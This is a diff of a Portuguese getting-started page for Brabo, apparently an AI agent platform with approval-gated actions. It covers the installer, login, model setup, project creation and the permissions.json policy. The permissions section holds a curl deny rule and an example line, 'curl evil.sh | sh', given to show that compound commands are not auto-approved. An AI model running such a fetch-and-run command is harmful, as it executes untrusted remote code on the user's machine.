@@ -3,390 +3,185 @@ id: getting-started
 title: Primeiros passos
 sidebar_label: Primeiros passos
 sidebar_position: 5
-description: Do clone ao primeiro turno de agente, com o que checar quando cada etapa não funciona.
-keywords: [instalação, setup, onboarding, primeiro projeto, ollama]
+description: Instale o Brabo, entre, configure um modelo e rode o primeiro turno de um agente, com o sinal de que cada passo deu certo.
+keywords: [instalação, setup, onboarding, primeiro projeto, ollama, install.sh]
+tipo: tutorial
 ---
 
 # Primeiros passos
 
-Do clone até um agente trabalhando. Se algo falhar, cada etapa tem o que
-conferir logo abaixo dela.
+Do instalador até um agente trabalhando. Cada passo termina com **Como saber que
+deu certo**, e o que costuma dar errado fica numa nota recolhida logo abaixo.
+
+Esta página é para **usar** o Brabo. Para mexer no código dele, veja
+[Desenvolver o Brabo](how-to/desenvolver-o-brabo.md).
 
 ## Antes de começar
 
-| ferramenta | por quê |
+| você precisa de | por quê |
 |---|---|
-| Docker e Docker Compose | tudo sobe em container |
-| Node 20+ e **pnpm** | o monorepo é pnpm; `npm install` não funciona |
-| ~6 GiB de RAM livre | Postgres, três apps e, se quiser agente de verdade, o Ollama |
+| Docker com Compose | tudo sobe em container |
+| ~6 GiB de RAM livre | banco, api, engine, web e, se quiser agente local, o Ollama |
+| Linux ou macOS | o instalador e o agente local são testados neles |
 
-Elixir **não** é obrigatório: o engine roda no container. Você só precisa dele
-no host se for rodar `pnpm engine:dev` fora do Docker — e aí precisa da versão
-exata (1.20.4 / OTP 29.1.1), porque o `mix format` de versões diferentes deixa
-o CI vermelho.
+## 1. Instalar
 
-## 1. Subir
+Baixe o instalador e rode o **arquivo**, com `bash`:
 
 ```bash
-git clone git@github.com:daneiel/brabo.git
-cd brabo
-cp .env.example .env
-pnpm install
-pnpm dev
+curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh
 ```
 
-O `.env.example` já vem com tudo apontando para os containers — na primeira
-subida você não precisa editar nada.
+Para ver o que ele faria antes de deixá-lo fazer, rode `bash install.sh --print-plan`.
 
-`pnpm dev` sobe Postgres 16 + pgvector, api, engine e web, e aplica as
-migrações dos dois lados. A primeira vez baixa imagens e leva alguns minutos.
+Ele precisa ser um arquivo, e não `curl … | sh`, por dois motivos: faz perguntas
+no terminal (que o pipe tomaria) e confere o próprio hash contra o manifesto
+assinado da Release. No caminho, ele pergunta se liga o
+broker de container (pode responder não) e se liga o Ollama, e pede e-mail e
+senha da primeira conta. A senha não é gravada em lugar nenhum.
 
-### Os dois modos locais não coexistem {#the-two-local-modes-dont-coexist}
+**Como saber que deu certo:** o instalador confere o `/health` da api e do
+engine antes de dizer que instalou, e termina com uma linha `Web: http://localhost:8088`.
 
-Há duas formas de rodar o Brabo na sua máquina, e elas **disputam as mesmas
-portas**:
+<details>
+<summary>Se der errado</summary>
 
-| modo | sobe com | web em | o que é |
-|---|---|---|---|
-| **desenvolvimento** | `pnpm dev` | <http://localhost:5173> | compose + Vite, com hot reload |
-| **validação** | `make deploy-local` | <http://localhost:8088> | k3d com as imagens de produção |
+- **Porta ocupada:** o instalador diz qual. Libere-a e rode de novo.
+- **Já havia uma instalação:** ele faz backup, prova que o backup restaura e só então migra.
 
-Os dois publicam api em `:3000` e engine em `:4000`. Isso é **deliberado**
-(ADR 0025, decisão 10): mantendo as portas, o `docker/smoke.sh` vale nos dois
-sem tradução. O preço é que só um roda por vez.
-
-Com o cluster de pé, o `pnpm dev` não consegue publicar a porta do `api`; como
-o serviço `web` depende dele, a **5173 nunca abre**. Um `preflight` roda antes
-do compose e diz exatamente isso, em vez do `port is already allocated` do
-Docker:
-
-```bash
-make k8s-down && pnpm dev     # do modo validação para o de desenvolvimento
-```
-
-Para saber em qual você está sem adivinhar: `pnpm dev:preflight`.
-
-### Uma instalação e um checkout na mesma máquina
-
-O compose de dev é o projeto Docker **`brabo-dev`** (containers
-`brabo-dev-api-1`…, volumes `brabo-dev_pgdata`…); uma instalação feita pelo
-`install.sh` é **`brabo`**. Até o ADR 0170 os dois se chamavam `brabo`, então
-compartilhavam containers, rede e volumes, e o `reset-total.sh` apagaria o banco
-da instalação.
-
-Mesmo com os nomes separados, o `pnpm dev` (pelo preflight) e o
-`reset-total.sh` **recusam** enquanto houver na máquina container do compose de
-instalação, e os listam. Para desenvolver, derrube a instalação **sem** `-v` —
-os volumes e os dados ficam, e `up -d` a traz de volta:
-
-```bash
-docker compose -f <pasta da instalação>/docker/docker-compose.install.yml \
-  --env-file <pasta da instalação>/.env down   # o preflight imprime os caminhos exatos
-```
-
-**Desenvolvia aqui antes do ADR 0170?** Os dados seguem nos volumes antigos
-`brabo_*`, e o próximo `pnpm dev` começa com `brabo-dev_*` vazios; o preflight
-avisa. Copiar os dados, recomeçar do zero e distinguir os volumes do dev antigo
-dos de uma instalação estão no runbook, "Moving a dev environment to brabo-dev".
-
-### Pasta local dos workspaces {#local-folder-for-workspaces}
-
-Por padrão, os arquivos que os agentes escrevem vivem num volume Docker
-gerenciado — não é uma pasta que você abre no Finder/Explorer. Para trocar
-por uma pasta real do seu disco, defina no `.env`:
-
-```bash
-PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
-GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
-```
-
-As duas juntas, sempre — `api` e `engine` leem o mesmo caminho, e valores
-diferentes fariam os dois enxergarem árvores diferentes do mesmo
-repositório. A pasta escolhida vira a raiz de **todos** os projetos desta
-instância — não aponte para `$HOME` inteiro nem para uma pasta com outros
-segredos seus.
-
-Dentro dela, cada projeto tem sua própria subpasta, nomeada por
-`workspace_dir_name` (RN-109): projeto criado a partir desta mudança ganha
-um nome LEGÍVEL, `<pasta>/<slug>-<8 chars do id>` (ex.: `<pasta>/checkout-
-3f2b1c8e`), em vez do UUID puro — mais fácil de reconhecer abrindo a pasta no
-Finder/Explorer. Projeto criado ANTES desta mudança continua com a pasta
-nomeada pelo UUID puro (`<pasta>/<project_id>`): o nome é decidido uma única
-vez, na criação, e nunca é recalculado — nem quando o slug do projeto muda
-depois nas Configurações.
-
-Nada na política de aprovação muda: dentro do escopo do projeto o agente já
-tinha acesso mais livre e fora dele já pedia aprovação (RN-075) — só o que
-antes ficava invisível dentro do volume passa a estar numa pasta que você
-pode abrir com seu próprio editor e `git`.
-
-Os containers de `api` e `engine` rodam como **root** em desenvolvimento
-(mesma situação já conhecida do `node_modules`/`apps/api/dist` — ver o aviso
-no topo deste repositório). Todo arquivo que o agente escrever na pasta
-local sai dono de `root` no seu disco — para editar/apagar sem `sudo`
-depois, rode uma vez `sudo chown -R $USER ~/brabo-projetos`
-(ajuste o caminho para o que você escolheu). Confirmado por execução: um
-`docker run` escrevendo num bind mount de teste deixou o arquivo
-inacessível ao usuário comum até um segundo container (rodando como root)
-removê-lo.
-
-Só testado em Linux/macOS. Bind mount de host no Docker Desktop para Windows
-tem armadilhas conhecidas (permissão/dono entre NTFS e o usuário do
-container, e NTFS não distingue maiúscula de minúscula onde `git worktree`
-espera que distinga) — não habilite lá ainda.
-
-**Se não subir:**
-
-| sintoma | causa |
-|---|---|
-| porta ocupada | quase sempre é o cluster local ainda de pé — veja acima. Se não for, mude `API_PORT`, `ENGINE_PORT`, `WEB_PORT` ou `OLLAMA_PORT` no `.env`. Mudar `WEB_PORT` é seguro: o `WEB_ORIGIN` do CORS deriva dele, então a origem aceita acompanha a porta ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
-| api sobe e cai | veja `docker compose logs api` — quase sempre é a migração |
+</details>
 
 ## 2. Entrar
 
-O login é da própria api — não há mais IdP externo
-([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Semeie um
-usuário pronto:
+Abra <http://localhost:8088> e entre com o e-mail e a senha que você digitou no
+instalador. O login é da própria api.
 
-```bash
-pnpm --filter api seed
-```
+**Como saber que deu certo:** você cai no dashboard do seu workspace.
 
-Ele cria uma conta por papel: `owner@brabo.dev` (owner), `maintainer@brabo.dev` (maintainer),
-`developer@brabo.dev` (developer) e `viewer@brabo.dev` (viewer), todas já
-com e-mail verificado e a senha `brabo12345678` — sobrescrevível por
-`BRABO_SEED_PASSWORD`. Junto vem o workspace **Acme Corp**, pronto para criar
-projeto.
+<details>
+<summary>Se der errado</summary>
 
-Abra <http://localhost:5173> e entre com essas credenciais.
+O login devolve **401** com a senha certa? A resposta é a mesma para senha
+errada, e-mail inexistente e conta bloqueada, de propósito.
+Confira o e-mail e tente de novo; se
+a conta nunca foi criada, rode o instalador outra vez.
 
-> **Por que semear em vez de se cadastrar pela tela?** O cadastro funciona, mas
-> o login exige e-mail verificado e o `MailSender` é log-only nesta fase — o
-> link de verificação sai no log da api e, por default, **sem o token**. Para
-> percorrer o fluxo de cadastro de verdade, ligue `AUTH_MAIL_LOG_TOKENS=true`
-> no `.env` e pegue o link em `docker compose logs api`. É inconveniente de
-> propósito: token de verificação em log de aplicação é credencial em texto
-> claro.
-
-**Se o login devolver 401 com a senha certa:** confira que o seed rodou contra
-o **mesmo** banco que a api está usando — `DATABASE_URL` do `.env`. A resposta
-é a mesma para senha errada, e-mail inexistente e conta bloqueada, de propósito
-([RN-032](business-rules/api.md#rn-032)), então ela não distingue os casos para
-você.
+</details>
 
 ## 3. Configurar um modelo
 
-Já vem um: o container do Ollama baixa **`llama3.2:1b`** sozinho no primeiro
-boot. Serve para ver o sistema funcionando de ponta a ponta sem configurar
-nada.
+Escolha um dos dois:
 
-Ele é pequeno demais para trabalho de verdade, então quando quiser mais:
+- **Ollama (local, grátis, offline):** responda **s** à pergunta do instalador,
+  ou ligue depois (o [runbook](runbook.md) explica como). O modelo padrão é pequeno e
+  serve para ver o sistema funcionar de ponta a ponta.
+- **Chave de um provedor:** na interface, em **Providers** (rodapé do menu). A
+  chave é cifrada com envelope encryption antes de tocar o banco.
 
-**Modelo local maior** — de graça, e roda offline:
+O modelo é resolvido em cascata, **sessão > agente > projeto > workspace**, e o
+primeiro que existir vale. Dá para
+deixar o local no geral e pôr um modelo de API só no QA, que é o papel que menos
+cabe num modelo pequeno.
 
-```bash
-docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
-```
+**Como saber que deu certo:** o provedor aparece em **Providers** sem erro de
+credencial, ou o Ollama responde e o modelo aparece na lista.
 
-**API de provedor** — na UI, em **Providers** (rodapé do menu). A
-chave é cifrada com envelope encryption antes de tocar o banco.
+<details>
+<summary>Se der errado</summary>
 
-O modelo é resolvido em cascata — **sessão > agente > projeto > workspace**, o
-primeiro que existir ([RN-020](business-rules/api.md#rn-020)). Dá para deixar o
-local no geral e pôr um modelo de API só no QA, que é o papel que menos cabe
-num modelo pequeno.
+Agente que não responde, ou responde vazio, quase sempre é o ambiente de
+inferência: contexto truncado ou pouca memória. O
+[runbook](runbook.md#ambiente-de-inferencia) explica como medir.
 
-> Com GPU NVIDIA, use `pnpm dev:gpu`. Sem a reserva de device o Ollama roda
-> 100% em CPU e um prompt de 7.000 tokens leva ~50 s **só de ingestão** — o
-> agente parece travado quando na verdade está lendo. O override é opt-in
-> porque sem o `nvidia-container-toolkit` no host a reserva faz o serviço
-> **falhar ao subir**.
+</details>
 
 ## 4. Criar um projeto
 
-Dashboard → **Novo projeto**. O wizard pede nome e como conectar o git:
+Dashboard → **Novo projeto**. O assistente pede um nome e como conectar o git:
 
 | opção | quando usar |
 |---|---|
-| **Local** | experimentar. Bare repos no disco, sem conta em lugar nenhum |
-| **GitHub** / **GitLab** | trabalho de verdade. PAT ou OAuth |
+| **Local** | experimentar: repositórios no disco, sem conta em lugar nenhum |
+| **GitHub** / **GitLab** | trabalho de verdade, com PAT ou OAuth |
 
 Ao confirmar, roda o **bootstrap de Gitflow**: cinco passos que criam `dev`,
-`qa`, `main`, aplicam proteções e commitam os arquivos base. O progresso
-aparece ao vivo.
+`qa` e `main`, aplicam proteções e commitam os arquivos base.
 
-Alguns passos podem sair como **`skipped`** (já estava feito) ou
-**`degraded`** (concluiu sem uma capability). Os dois são sucesso. Com o
-provider Local, a proteção de branch sempre sai `degraded` — não há plataforma
-para aplicá-la, e isso não enfraquece nada: quem impede merge indevido é o
-[teto no domínio](reference/permissions.md#caps), não a plataforma.
+**Como saber que deu certo:** os cinco passos aparecem concluídos, ao vivo.
 
-Se um passo falhar, corrija a causa e mande retomar: o bootstrap continua de
-onde parou, não recomeça
-([RN-029](business-rules/api.md#rn-029)).
+<details>
+<summary>Se der errado</summary>
+
+- **`skipped`** (já estava feito) e **`degraded`** (concluiu sem uma capability) são sucesso. Com o provider Local, a proteção de branch sempre sai `degraded`: não há plataforma para aplicá-la, e quem impede o merge indevido é o [teto no domínio](reference/permissions.md#caps).
+- Se um passo **falhar**, corrija a causa e mande retomar: o bootstrap continua de onde parou.
+
+</details>
 
 ## 5. O primeiro turno
 
-Abra o projeto → **Sessões** → nova sessão. O Criativo é quem conduz a ideação.
+Abra o projeto → **Sessões** → nova sessão. O Criativo conduz a ideação. Converse
+normalmente. Em algum momento ele vai querer fazer algo com efeito externo, e aí
+você vê o mecanismo central: a ação aparece em **Aprovações** esperando a sua
+decisão, em vez de acontecer. Aprove e olhe o `TokenMeter`: cada turno tem custo,
+medido na hora.
 
-Converse normalmente. Em algum momento ele vai querer fazer algo com efeito
-externo — e aí você vê o mecanismo central funcionando: a ação aparece em
-**Aprovações** esperando sua decisão, em vez de acontecer.
+**Como saber que deu certo:** uma ação em **Aprovações**, e depois dela aprovada
+o turno continua e o custo sobe no `TokenMeter`.
 
-Aprove e observe o `TokenMeter`: cada turno tem custo, medido na hora.
+<details>
+<summary>Se der errado</summary>
+
+| sintoma | onde olhar |
+|---|---|
+| agente não responde | há modelo configurado (passo 3)? |
+| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
+| painel não atualiza | o canal caiu; recarregue. O event log não se perde |
+| sessão parada em `closing` | o drain não completou, veja o [runbook](runbook.md#quando-a-sessao-escapa) |
+
+</details>
 
 ## 6. Afrouxar (ou apertar) a política
 
-Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz
-do workspace do projeto, é onde isso se ajusta:
+Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz do
+workspace do projeto, é onde isso se ajusta:
 
 ```json
 {
-  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
+  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
   "deny":  ["Terminal(curl:*)"],
   "ask":   []
 }
 ```
 
-Comece por `allow` de comandos idempotentes de leitura. Duas coisas que valem
-saber antes de mexer:
+Comece por `allow` de comandos idempotentes de leitura. Duas regras valem antes
+de mexer:
 
-- **Casamento é por prefixo de tokens, não substring.** `Terminal(pnpm test)`
-  casa `pnpm test --watch`, mas `Terminal(rm)` **não** casa `sudo rm -rf x`.
-- **Comando composto exige que todos os segmentos estejam em `allow`.**
-  `pnpm test && curl evil.sh | sh` não é auto-aprovado por causa da primeira
-  metade.
+- **Casamento é por prefixo de tokens, não substring.** `Terminal(rm)` **não** casa `sudo rm -rf x`.
+- **Comando composto exige todos os segmentos em `allow`.** `a && curl evil.sh | sh` não é auto-aprovado pela primeira metade.
 
 O formato completo está em [Permissões](reference/permissions.md).
 
-## Quando parece travado
+## Desenvolvendo no Brabo
 
-| sintoma | onde olhar |
-|---|---|
-| agente não responde | modelo configurado? `docker compose logs engine` |
-| resposta vazia ou sem sentido | quase sempre é [ambiente de inferência](runbook.md#ambiente-de-inferencia) — contexto truncado ou memória |
-| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
-| painel não atualiza | o canal Phoenix caiu; recarregue. O event log não se perde |
-| sessão parada em `closing` | o drain não completou — [runbook](runbook.md#quando-a-sessao-escapa) |
+Os dois modos locais disputam as mesmas portas, e a pasta dos workspaces tem
+armadilhas de permissão. Isso é de quem desenvolve, e mora no guia
+[Desenvolver o Brabo](how-to/desenvolver-o-brabo.md).
 
-## Desenvolvendo no projeto
+### Os dois modos locais não coexistem {#the-two-local-modes-dont-coexist}
 
-```bash
-pnpm --filter api test      # vitest
-pnpm --filter web test      # vitest
-pnpm engine:test            # ExUnit
-pnpm build                  # build de tudo
-pnpm db:generate            # depois de mudar apps/api/src/db/schema/<agregado>.ts
-pnpm db:migrate             # aplica as migrações
-pnpm dev:down               # derruba tudo
-```
+Veja [as portas dos dois modos](how-to/desenvolver-o-brabo.md).
 
-### Onde fica cada coisa
+### Pasta local dos workspaces {#local-folder-for-workspaces}
 
-```
-apps/
-  api/      NestJS + Drizzle          → schema "public"
-  engine/   Elixir/OTP + Phoenix      → schema "engine"
-  web/      React + Vite
-packages/
-  shared/   tipos TS compartilhados (import type only)
-design/     design system — fonte de verdade de UI
-docker/     compose de dev e prod, Dockerfiles, smoke.sh
-deploy/k8s/ base + overlays local/staging/prod (Kustomize)
-docs/       esta documentação, incluindo os ADRs
-scripts/
-  ci/       automação de release e política de branch (testada com vitest)
-  dev/      ferramentas locais — o menu do `pnpm bootstrap` e o preflight
-  docs/     geração e verificação da documentação
-website/    só a árvore do Redoc; o site é gerado por scripts/docs/site/ a partir de docs/
-```
-
-`apps/engine` fica fora do workspace pnpm (é um projeto Mix), com scripts na
-raiz que delegam para o `mix` (`pnpm engine:setup`, `pnpm engine:dev`,
-`pnpm engine:test`). Se o Elixir do host não for o do projeto, formate pelo
-container:
-
-```bash
-docker run --rm -v "$PWD/apps/engine:/app" -w /app \
-  hexpm/elixir:1.20.4-erlang-29.1.1-alpine-3.24.2 mix format
-```
-
-**Banco.** Um Postgres, uma database (`brabo`), dois schemas para nunca
-colidir: a api (Drizzle) usa `public`, com migrações em
-`apps/api/src/db/migrations/` e um arquivo de schema por agregado
-(`db/schema.ts` é só o barrel); o engine (Ecto/Oban) usa `engine`, via
-`migration_default_prefix`, com migrações em
-`apps/engine/priv/repo/migrations/`. O pgvector é habilitado por
-`docker/postgres/init.sql`, que roda uma vez na criação do volume.
-
-**Testes que protegem propriedades.** Nenhuma feature entra sem teste do
-caminho feliz e de um caso de falha. Os providers de git passam por uma suíte
-de contrato única, rodada contra os três (Local, GitHub, GitLab).
-`apps/api/test/interfaces/route-surface.spec.ts` confere as rotas contra
-[`security-surface.md`](security-surface.md) — rota nova sem classificação
-quebra o teste —, e `apps/engine/test/engine_web/route_surface_test.exs` exige
-401 sem token em cada rota do engine, salvo exceções nomeadas.
-
-**Um turno, de ponta a ponta:**
-
-```mermaid
-sequenceDiagram
-  participant U as Você
-  participant W as web
-  participant A as api
-  participant E as engine
-  participant L as LLM
-
-  U->>W: abre uma sessão
-  W->>A: POST /sessions
-  A->>A: grava session.created (event log + outbox)
-  A-->>E: Oban consome a outbox
-  E->>E: SessionServer + Harness montam o contexto
-  E->>L: turno
-  L-->>E: "quero rodar esta ferramenta"
-  E->>A: vira proposed_action
-  A->>A: IAM → agent_autonomy → permissions.json → tetos
-  A-->>U: pede aprovação
-  U->>A: aprova
-  A-->>E: executa
-  E->>A: evento imutável
-  A-->>W: broadcast — o painel atualiza
-```
-
-### O menu, para não decorar isso tudo
-
-```bash
-pnpm bootstrap
-```
-
-Esses comandos moram em três lugares que não conversam — `package.json`, o
-`Makefile` (Kubernetes) e scripts em `deploy/k8s/` e `docker/`. O menu junta os
-quatro grupos (Docker, K8s, Database, Test) numa porta só, navegado por dígito
-sem Enter, com `v` para voltar e `q` para sair; os atalhos válidos aparecem no
-rodapé. Enquanto um comando roda, a tela mostra só que está rodando — `↓` revela
-a saída ao vivo e `↑` a esconde.
-
-Ele **não reimplementa nada**: cada item chama exatamente o comando que já
-existe, e `pnpm bootstrap --print-commands` imprime a árvore inteira com o
-comando de cada folha, sem executar — é assim que se confere o que ele faz antes
-de deixá-lo fazer. A lista completa está em
-[Scripts](reference/scripts.md).
-
-Um item pede cuidado: **`Database › Delete`** apaga todas as tabelas (as da api e
-as do engine, que dividem o mesmo banco). É a única tela que pede Enter, exige
-digitar o nome do banco, e diz ao final que recuperar é `pnpm db:migrate` **e**
-`pnpm engine:migrate`.
-
-Trabalhe sempre em `feature/*` a partir de `dev`, com conventional commits em
-pt-BR. `CLAUDE.md` tem as convenções completas.
-
-> Os containers de `api` e `web` rodam como root em desenvolvimento e escrevem
-> no bind mount. Se depois quiser buildar no host, rode uma vez
-> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.
+Veja [a pasta dos workspaces](how-to/desenvolver-o-brabo.md#pasta-dos-workspaces).
 
 ## Depois
 
-- [Arquitetura](architecture.md) — como as peças se encaixam
-- [Regras de negócio](business-rules.md) — o que o sistema garante, e onde isso
-  vive no código
-- [Runbook](runbook.md) — quando sair de desenvolvimento
+- [Arquitetura](architecture.md): como as peças se encaixam
+- [Regras de negócio](business-rules.md): o que o sistema garante, e onde isso vive no código
+- [Runbook](runbook.md): operar, restaurar, rotacionar chave
+
+## Para saber mais
+
+- A forma do instalador: [ADR 0150](adr/0150-instalador-de-uma-linha.md); o login da api: [ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md).
+- Regras: [RN-511](business-rules/infra.md#rn-511) e [RN-526](business-rules/produto.md#rn-526) (instalador), [RN-032](business-rules/api.md#rn-032) (login), [RN-020](business-rules/api.md#rn-020) (modelo em cascata), [RN-029](business-rules/api.md#rn-029) (retomar o bootstrap).
